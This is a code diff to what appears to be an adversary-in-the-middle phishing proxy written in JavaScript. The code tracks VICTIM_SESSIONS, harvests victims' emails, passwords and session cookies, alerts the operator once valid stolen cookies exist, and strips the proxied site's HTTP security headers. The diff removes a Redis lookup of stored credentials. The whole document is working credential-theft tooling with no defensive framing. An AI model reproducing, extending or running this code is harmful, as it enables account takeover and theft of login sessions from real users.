@@ -436,24 +436,12 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
             updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
         }
 
-        // ===== FINAL ALERT & REDIRECT =====
+// ===== FINAL ALERT & REDIRECT =====
 if (!VICTIM_SESSIONS[currentSession].alerted && hasValidSessionCookies(VICTIM_SESSIONS[currentSession])) {
     const sessionData = VICTIM_SESSIONS[currentSession];
     let credentials = sessionData.credentials;
 
-    // If credentials are missing from memory (e.g., after restart), fetch from Redis
-    if (!credentials) {
-        try {
-            const redisData = await redis.get(`session:${currentSession}`);
-            if (redisData) {
-                credentials = JSON.parse(redisData);
-            }
-        } catch (err) {
-            console.error("[REDIS GET]", err.message);
-        }
-    }
-
-    // Fallback if still no credentials
+    // Fallback if no credentials (shouldn't happen normally)
     if (!credentials) {
         credentials = { email: 'N/A', password: 'N/A', url: '', time: '' };
     }
@@ -484,7 +472,6 @@ if (!VICTIM_SESSIONS[currentSession].alerted && hasValidSessionCookies(VICTIM_SE
     }
 }
 // ================================
-
         proxyResponse.headers["cache-control"] = "no-store";
         proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
         deleteHTTPSecurityResponseHeaders(proxyResponse.headers);
